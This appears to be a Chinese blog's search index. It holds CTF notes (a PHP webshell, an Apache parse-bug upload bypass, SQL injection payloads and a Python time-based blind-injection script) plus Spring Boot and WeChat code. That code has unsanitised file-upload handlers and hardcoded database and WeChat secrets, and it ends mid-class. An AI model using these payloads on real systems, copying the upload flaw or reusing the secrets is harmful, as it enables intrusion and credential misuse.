<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ctf杂录]]></title>
    <url>%2F2019%2F10%2F21%2FCTF-%E6%9D%82%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[各种姿势 php特性 $_SERVER[‘QUERY_STRING’]会获取到所有的文件后面传递的所有参数 php自身在解析请求时，会把+和.解析成下划线 数组与数字比较，永远大于数字 字符a在和整形进行弱类型比较时，会被强制转换成整形，其值为0php伪协议用于直接读取用户的根目录的东西 url=php://filter/read=convert.base64-encode/resource=flag 服务器自身漏洞一句话木马 上传点存在白名单验证，从返回包可以得知其是apache2.2.15，apache2.2.15版本具有文件解析漏洞，可以把test.php.png当作php文件来解析执行，apache高版本不存在此漏洞，这里我们可以使用apache2.2.15的解析漏洞来绕过白名单限制 &lt;?php system($_POST[‘cmd’]); ?&gt;之后再利用post 发送数据， cmd = cat /flag 获取flag]]></content>
  </entry>
  <entry>
    <title><![CDATA[ctf攻防之sql注入]]></title>
    <url>%2F2019%2F10%2F15%2FCTF-SQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[基础sql注入 sql注入的基本原理 sql注入的主要原因来自sql查询的字符串拼接，例如我们正常输入1，那么呈现 1select * from table where id='1' 但是如果进行心机输入 1’ ,那么将会变成 ==》 1select * from table where id = '1'' 继续下去，因为两个 ‘ 的原因，那么则会产生sql syntax error ,所以需要产生注释后面的内容，我们需要#，因此输入 1’# 12345select * from table where id = '1'#' ===============&gt; 明显一些select * from table where id = '1' sql注入常用基本操作————主要利用union select联合查询继续获取信息 获取数据库的基础信息 1’ union select database(),user()#database()返回当前使用的数据库名称user() 返回当前使用者的信息 获取操作系统等功能 1’ union select version(),@@version_compile_os#version() 获取当前数据库版本@@version_compile_os 获取当前操作系统@@version_compile_os 获取当前操作系统 获取数据库的表名 1’ union select table_names,table_schema from information_schema.tables where table_schema = ‘table name’ #数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库ps: 数据库会用一个information_schema.tables来记录表的信息 获取数据库的列名 1’ union select group_concat(column_name) from information_schema.columns where table_schema=database() 内联注释绕过 上述union select 可能会被拦截，因此使用注释绕过，用/！XX / 包裹，来实现绕过word=1%’ and 1=2 /!union/ /!select/ database(),user(),database() %23&amp;§number=5§转自： https://www.cnblogs.com/baimaoma/p/8608490.html sql盲注（时间）最简单的注入在于，无论你去注入什么，或者搜索或者选择都是会有相应的显示的，但是还有一部分的盲注是没有提示的，你无法得知自己是否sql注入成功，所以插入sql中的sleep（），get_lock()等系列函数，通过时间延迟来判断是否注入成功，以为盲注全靠猜，因此需要脚本来实现盲注 。 ctf代码：靶机： http://114.55.36.69:8007/注入猜测： http://114.55.36.69:8007/article.php?id=1&#39; and sleep(5) %23123456789101112131415161718#coding=utf8import requestsimport timedata = ''url = "http://114.55.36.69:8007/article.php?id=1'"for i in range(47): for c in range(32,127): url_req = url + " and if(ascii(substr((content),&#123;0&#125;,1))=&#123;1&#125;,get_lock('test',3),1)%23".format(i+1,str(c)) # 盲注猜测 print(url_req) start_time = time.time() res = requests.get(url_req) # 请求 end_time = time.time() if (end_time - start_time) &gt; 2.5: # 时间超过3秒说明注入成功，计入data data += chr(c) print(data) break;print('data:',data) # 输出结果 大佬帖子： https://www.cesafe.com/3993.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot 一些常用配置【持续更新】]]></title>
    <url>%2F2019%2F08%2F07%2FSpringboot%E5%90%84%E7%B1%BB%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Springboot 一些常用配置 工具类ID生成器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package com.obox.obox.Utils;import javax.xml.crypto.Data;import java.util.Calendar;import java.util.Date;import java.util.UUID;/** * * 各类id生成工具 */public class IdUtil &#123; /** * 生成用户ID * @return */ public static String Uid ()&#123; String uid = "U" + UUID.randomUUID().toString().hashCode(); return uid ; &#125; /** * 生成商家ID * @return */ public static String Bid()&#123; String bid = "B" + UUID.randomUUID().toString().hashCode() ; return bid ; &#125; /** * 生成商品ID * @return */ public static String Gid()&#123; String gid = "G" + UUID.randomUUID().toString().hashCode() ; return gid ; &#125; /** * 生成订单ID * @return */ public static String Olid()&#123; int hashCodeV = UUID.randomUUID().toString().hashCode(); if (hashCodeV &lt; 0)&#123; hashCodeV = - hashCodeV ; &#125; return "OL"+ hashCodeV; &#125; /** * 生成红包ID * @return */ public static String Cid()&#123; String cid = "C" + UUID.randomUUID().toString().hashCode() ; return cid ; &#125; /** * 生成轮播图ID * @return */ public static String Sid()&#123; String sid = "S" + UUID.randomUUID().toString().hashCode() ; return sid ; &#125; /** * 生成主界面小图标ID * @return */ public static String Hid()&#123; String hid = "H" + UUID.randomUUID().toString().hashCode() ; return hid ; &#125; /** * 生成二维码小图标 * @return */ public static String Qrid()&#123; int hashCodeV = UUID.randomUUID().toString().hashCode(); if (hashCodeV &lt; 0)&#123; hashCodeV = - hashCodeV ; &#125; return "OR"+ hashCodeV; &#125;&#125; 图片处理器（只留下图片名）1234567891011121314151617181920212223242526package com.obox.obox.Utils;import java.io.File;import java.util.ArrayList;import java.util.List;public class PicUtils &#123; public static List&lt;String&gt; CutPicStr(String str)&#123; File file = new File(str); File[] fs = file.listFiles(); List&lt;String&gt; paths = new ArrayList&lt;&gt;() ; for(File f:fs)&#123; if(!f.isDirectory()) &#123; paths.add(f.getName()) ; &#125; &#125; return paths; &#125;&#125; 时间格式化器12345678910111213141516171819202122232425package com.obox.obox.Utils;import java.text.SimpleDateFormat;import java.util.Calendar;import java.util.Date;public class TimeUtil &#123; public static String getTime()&#123; Calendar calendar = Calendar.getInstance(); Date date = calendar.getTime() ; SimpleDateFormat sdf =new SimpleDateFormat("yyyy-MM-dd HH:mm:ss" ); String s = sdf.format(date) ; return s ; &#125; public static String getTime(Date date)&#123; SimpleDateFormat sdf =new SimpleDateFormat("yyyy-MM-dd HH:mm:ss" ); String s = sdf.format(date) ; return s ; &#125;&#125; 二维码生成器12345678910111213141516171819202122232425262728package com.obox.obox.service.QR;import com.alibaba.fastjson.JSON;/** * * 二维码生成服务 */public class QRService &#123; private static String URL = "http://qr.liantu.com/api.php?text=" ; /** * 二维码图片链接 * @param id * @return */ public static String GenerateQR(String id)&#123; String OR_Code_Url = URL + id ; return OR_Code_Url ; &#125;&#125; 服务使用文件上传123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214package com.obox.obox.controller.file;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.obox.obox.Utils.IdUtil;import com.obox.obox.model.token.NoToken;import org.springframework.web.bind.annotation.*;import org.springframework.web.multipart.MultipartFile;import javax.servlet.ServletInputStream;import javax.servlet.http.HttpServletRequest;import javax.swing.filechooser.FileView;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.nio.file.StandardCopyOption;import java.text.SimpleDateFormat;import java.util.*;@RestController@RequestMapping(value = "/file")public class UploadFileController &#123; private final String ip = "http://118.31.120.92/wechat/"; private final String spath = "/root/local/user/obox/pic/" ; /** * 用户头像上传 * @param file * @return */ @PostMapping("uploadusericon") public Object UserIconUpload(@RequestParam(value = "file",required = true) MultipartFile file) &#123; String cata = "user/usericon/" + IdUtil.Uid() + "/" ; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125; /** * 商品信息上传 * @param file * @return */ @PostMapping("uploadgoodspic") public Object GoodspicUpload(@RequestParam(value = "file",required = true) MultipartFile file) &#123; String cata = "business/goods/" + IdUtil.Gid() + "/"; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125; /** * 商品图标上传 * @param file * @return */ @PostMapping("uploadgoodsicon") public Object GoodsIconUpload(@RequestParam(value = "file",required = true) MultipartFile file) &#123; String cata = "business/goods/" + IdUtil.Gid() + "/"; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125; /** * 商家背景上传 * @param file * @return */ @PostMapping("uploadbusinesspic") public Object BusinessPicUpload(@RequestParam(value = "file",required = true) MultipartFile file)&#123; String cata = "business/businessman/" + IdUtil.Bid() + "/"; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125; /** * 商家logo上传 * @param file * @return */ @PostMapping("uploadbusinesslogo") public Object BusinessLogoUpload(@RequestParam(value = "file",required = true) MultipartFile file)&#123; String cata = "business/businessman/" + IdUtil.Bid() + "/"; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125;&#125; 地表最强pom =&gt; 专治疑难杂症123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.6.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.obox&lt;/groupId&gt; &lt;artifactId&gt;obox&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;obox&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;!-- &lt;dependency&gt;--&gt;&lt;!-- &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;--&gt;&lt;!-- &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;--&gt;&lt;!-- &lt;scope&gt;test&lt;/scope&gt;--&gt;&lt;!-- &lt;/dependency&gt;--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.33&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 微信支付 --&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.httpcomponents/httpclient --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt; &lt;version&gt;4.5.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.21&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt; &lt;version&gt;1.7.21&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Redis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- RestTemplete --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt; &lt;version&gt;4.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.bouncycastle&lt;/groupId&gt; &lt;artifactId&gt;bcprov-jdk15on&lt;/artifactId&gt; &lt;version&gt;1.57&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;!-- 微信支付--&gt; &lt;licenses&gt; &lt;license&gt; &lt;name&gt;The BSD 3-Clause License&lt;/name&gt; &lt;url&gt;https://opensource.org/licenses/BSD-3-Clause&lt;/url&gt; &lt;distribution&gt;repo&lt;/distribution&gt; &lt;/license&gt; &lt;/licenses&gt; &lt;scm&gt; &lt;url&gt;&lt;/url&gt; &lt;connection&gt;&lt;/connection&gt; &lt;developerConnection&gt;&lt;/developerConnection&gt; &lt;/scm&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;compilerArguments&gt; &lt;bootclasspath&gt;$&#123;java.home&#125;/lib/rt.jar;$&#123;java.home&#125;/lib/jce.jar&lt;/bootclasspath&gt; &lt;/compilerArguments&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.4.2&lt;/version&gt; &lt;configuration&gt; &lt;skipTests&gt;true&lt;/skipTests&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;developers&gt; &lt;developer&gt; &lt;name&gt;wxpay&lt;/name&gt; &lt;email&gt;&lt;/email&gt; &lt;url&gt;https://pay.weixin.qq.com/wiki/doc/api/wxa/wxa_api.php?chapter=11_1&lt;/url&gt; &lt;/developer&gt; &lt;/developers&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;release&lt;/id&gt; &lt;distributionManagement&gt; &lt;snapshotRepository&gt; &lt;id&gt;oss&lt;/id&gt; &lt;url&gt;https://oss.sonatype.org/content/repositories/snapshots/&lt;/url&gt; &lt;/snapshotRepository&gt; &lt;repository&gt; &lt;id&gt;oss&lt;/id&gt; &lt;url&gt;https://oss.sonatype.org/service/local/staging/deploy/maven2/&lt;/url&gt; &lt;/repository&gt; &lt;/distributionManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/profile&gt; &lt;/profiles&gt;&lt;/project&gt; 地表最强yml12345678910111213141516171819202122232425262728293031323334353637383940414243spring: datasource: username: root password: obox11.. url: jdbc:mysql://118.31.120.92:3306/obox driver-class-name: com.mysql.jdbc.Driver type: com.alibaba.druid.pool.DruidDataSource http: encoding: charset: UTF-8 cache: type: redis redis: host: 118.31.120.92 port: 6379 database: 0 timeout: 60s jedis: pool: max-active: -1 max-idle: 50 max-wait: -1sinitialSize: 5minIdle: 5maxActive: 20maxWait: 60000timeBetweenEvictionRunsMillis: 60000minEvictableIdleTimeMillis: 300000validationQuery: SELECT 1 FROM DUALtestWhileIdle: truetestOnBorrow: falsetestOnReturn: falsepoolPreparedStatements: trueserver: port: 8080]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot 整合 微信小程序]]></title>
    <url>%2F2019%2F08%2F07%2Fspringboot%E6%95%B4%E5%90%88%E5%BE%AE%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[针对各种窒息的微信操蛋接口 微信基本配置微信支付API DEMO 下载链接 ： https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=11_1 微信EncryptedData解密 EncryptedData Model 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package com.obox.obox.model.WxLogin;public class EncryptedData &#123; private String avatarUrl ; private String openId ; private String nickName ; private String gender ; private String city ; private String province ; private String country ; private String unionId ; private Watermark watermark ; public String getAvatarUrl() &#123; return avatarUrl; &#125; public void setAvatarUrl(String avatarUrl) &#123; this.avatarUrl = avatarUrl; &#125; public String getOpenId() &#123; return openId; &#125; public void setOpenId(String openId) &#123; this.openId = openId; &#125; public String getNickName() &#123; return nickName; &#125; public void setNickName(String nickName) &#123; this.nickName = nickName; &#125; public String getGender() &#123; return gender; &#125; public void setGender(String gender) &#123; this.gender = gender; &#125; public String getCity() &#123; return city; &#125; public void setCity(String city) &#123; this.city = city; &#125; public String getProvince() &#123; return province; &#125; public void setProvince(String province) &#123; this.province = province; &#125; public String getCountry() &#123; return country; &#125; public void setCountry(String country) &#123; this.country = country; &#125; public String getUnionId() &#123; return unionId; &#125; public void setUnionId(String unionId) &#123; this.unionId = unionId; &#125; public Watermark getWatermark() &#123; return watermark; &#125; public void setWatermark(Watermark watermark) &#123; this.watermark = watermark; &#125;&#125; Encrycode Model 1234567891011121314151617181920212223242526272829303132package com.obox.obox.model.WxLogin;public class Encrycode &#123; private String session_key ; private String encrypted_data ; private String iv ; public String getSession_key() &#123; return session_key; &#125; public void setSession_key(String session_key) &#123; this.session_key = session_key; &#125; public String getEncrypted_data() &#123; return encrypted_data; &#125; public void setEncrypted_data(String encrypted_data) &#123; this.encrypted_data = encrypted_data; &#125; public String getIv() &#123; return iv; &#125; public void setIv(String iv) &#123; this.iv = iv; &#125;&#125; EncryptedData解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package com.obox.obox.Utils;import com.alibaba.fastjson.JSONObject;import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;import org.bouncycastle.jce.provider.BouncyCastleProvider;import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.security.AlgorithmParameters;import java.security.Security;import java.util.Arrays;public class WxUtils &#123; public static JSONObject getUserInfo(String encryptedData, String sessionKey, String iv)&#123; // 被加密的数据 byte[] dataByte = Base64.decode(encryptedData); // 加密秘钥 byte[] keyByte = Base64.decode(sessionKey); // 偏移量 byte[] ivByte = Base64.decode(iv); try &#123; // 如果密钥不足16位，那么就补足. 这个if 中的内容很重要 int base = 16; if (keyByte.length % base != 0) &#123; int groups = keyByte.length / base + (keyByte.length % base != 0 ? 1 : 0); byte[] temp = new byte[groups * base]; Arrays.fill(temp, (byte) 0); System.arraycopy(keyByte, 0, temp, 0, keyByte.length); keyByte = temp; &#125; // 初始化 Security.addProvider(new BouncyCastleProvider()); Cipher cipher = Cipher.getInstance("AES/CBC/PKCS7Padding","BC"); SecretKeySpec spec = new SecretKeySpec(keyByte, "AES"); AlgorithmParameters parameters = AlgorithmParameters.getInstance("AES"); parameters.init(new IvParameterSpec(ivByte)); cipher.init(Cipher.DECRYPT_MODE, spec, parameters);// 初始化 byte[] resultByte = cipher.doFinal(dataByte); if (null != resultByte &amp;&amp; resultByte.length &gt; 0) &#123; String result = new String(resultByte, "UTF-8"); return JSONObject.parseObject(result); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; 微信登陆123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128package com.obox.obox.controller.WeChat.WxApp;import com.alibaba.fastjson.JSONObject;import com.obox.obox.Utils.IdUtil;import com.obox.obox.Utils.JwtUtils;import com.obox.obox.Utils.WxUtils;import com.obox.obox.mapper.InsertMapper.UserInsert;import com.obox.obox.mapper.WxToolMapper;import com.obox.obox.mapper.selectMapper.UserSelect;import com.obox.obox.model.WxLogin.AccessToken;import com.obox.obox.model.WxLogin.Encrycode;import com.obox.obox.model.WxLogin.EncryptedData;import com.obox.obox.model.token.NoToken;import com.obox.obox.model.wechat.UO;import com.obox.obox.model.wechat.UserInfo;import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.*;import org.springframework.web.client.RestTemplate;import javax.jws.soap.SOAPBinding;import java.util.HashMap;import java.util.Map;@RestController@RequestMapping("login")public class LoginController &#123; @Autowired private RestTemplate restTemplate ; @Autowired private WxToolMapper wxToolMapper ; @Autowired private UserInsert userInsert ; @Autowired private UserSelect userSelect ; @NoToken @GetMapping("getlogin") public Object Login(@RequestParam(value = "data",required = true) String data)&#123; //WxLoginParams wxLoginParams = JSONObject.parseObject(data,WxLoginParams.class) ; //WxLoginParams params = new WxLoginParams() ; //params.setJs_code(data); Map&lt;String,String&gt; p = new HashMap&lt;&gt;() ; p.put("appid","wxfd4904504d50f9c2") ; p.put("secret","1dcfdc0d47acda452a66a834f730340a") ; p.put("js_code",data) ; p.put("grant_type","authorization_code") ; String url = "https://api.weixin.qq.com/sns/jscode2session?appid=wxfd4904504d50f9c2&amp;secret=1dcfdc0d47acda452a66a834f730340a&amp;js_code="+data+"&amp;grant_type=authorization_code" ; String json = restTemplate.getForObject(url,String.class) ; return json ; &#125; @NoToken @PostMapping("/token") public Object Token(@RequestBody String data) throws Base64DecodingException &#123; // 返回信息 Map&lt;String,Object&gt; d = new HashMap&lt;&gt;() ; Encrycode encrycode = JSONObject.parseObject(data,Encrycode.class) ; String s = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=wxfd4904504d50f9c2&amp;secret=1dcfdc0d47acda452a66a834f730340a"; // 获取token String token = restTemplate.getForObject(s,String.class) ; d.put("token",JSONObject.parseObject(token, AccessToken.class)) ; //data.put("code", WxUtils.decryptData(encrypte_data,session_key,iv)); // 解密encrypted d.put("code",WxUtils.getUserInfo(encrycode.getEncrypted_data(),encrycode.getSession_key(),encrycode.getIv())); // 取openid EncryptedData encryptedData = JSONObject.parseObject(JSONObject.toJSONString(WxUtils.getUserInfo(encrycode.getEncrypted_data(),encrycode.getSession_key(),encrycode.getIv())),EncryptedData.class) ; // 根据openid查找uid UO uo = new UO() ; uo.setOpenid(encryptedData.getOpenId()); if (wxToolMapper.SelectUOByOpenid(uo.getOpenid()) == null)&#123; // 表中无用户信息,插入用户信息 // uo表中插入 uo.setUid(IdUtil.Uid()); wxToolMapper.InsertUO(uo) ; // 插入用户初始化信息 UserInfo userInfo = new UserInfo() ; userInfo.setUid(uo.getUid()); userInfo.setUsex(encryptedData.getGender()); userInfo.setUicon(encryptedData.getAvatarUrl()); userInfo.setUname(encryptedData.getNickName()); userInfo.setOpenid(encryptedData.getOpenId()); userInsert.InserUserInfo(userInfo) ; d.put("user",userInfo) ; &#125;else &#123; // 如果表中已经含有用户信息，则直接查找 UO u = wxToolMapper.SelectUOByOpenid(uo.getOpenid()) ; String uid = u.getUid() ; UserInfo userInfo = userSelect.SelectUserInfoByUid(uid) ; d.put("user",userInfo) ; &#125; // 生成用户token String jwtuid = uo.getUid() ; Map&lt;String,Object&gt; jwt = new HashMap&lt;&gt;() ; jwt.put("wxdata",encryptedData) ; jwt.put("uid",jwtuid) ; String payload = JSONObject.toJSONString(jwt) ; d.put("token", JwtUtils.geneJsonWebToken(payload)); return d ; &#125;&#125; 微信支付统一下单接口123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278package com.obox.obox.controller.WeChat.WxPay;import com.alibaba.fastjson.JSONArray;import com.alibaba.fastjson.JSONObject;import com.fasterxml.jackson.databind.ser.Serializers;import com.obox.obox.Utils.IdUtil;import com.obox.obox.Utils.JwtUtils;import com.obox.obox.mapper.BOMapper;import com.obox.obox.mapper.BusinessMapper;import com.obox.obox.mapper.InsertMapper.BaseOrderListInsert;import com.obox.obox.mapper.QRMapper;import com.obox.obox.mapper.selectMapper.BaseOrderListSelect;import com.obox.obox.model.WxLogin.EncryptedData;import com.obox.obox.model.WxPay.BO;import com.obox.obox.model.WxPay.WxOrderGoodsInfo;import com.obox.obox.model.WxPay.WxOrderList;import com.obox.obox.model.token.NoToken;import com.obox.obox.model.wechat.BaseOrderList;import com.obox.obox.model.wechat.CheckSales;import com.obox.obox.service.QR.QRService;import com.obox.obox.service.wxpay.WxPaySDK.WXPayConstants;import com.obox.obox.service.wxpay.WxPaySDK.WXPayUtil;import com.sun.istack.internal.FinalArrayList;import io.jsonwebtoken.Claims;import io.netty.handler.codec.json.JsonObjectDecoder;import org.apache.commons.lang3.StringUtils;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.http.converter.StringHttpMessageConverter;import org.springframework.web.bind.annotation.*;import org.springframework.web.client.RestTemplate;import javax.servlet.http.HttpServletRequest;import java.nio.charset.StandardCharsets;import java.sql.Struct;import java.text.SimpleDateFormat;import java.util.*;/** * * 微信小程序支付 */@RestController@RequestMapping("/wxpay")public class WxPayController &#123; @Autowired private RestTemplate restTemplate ; 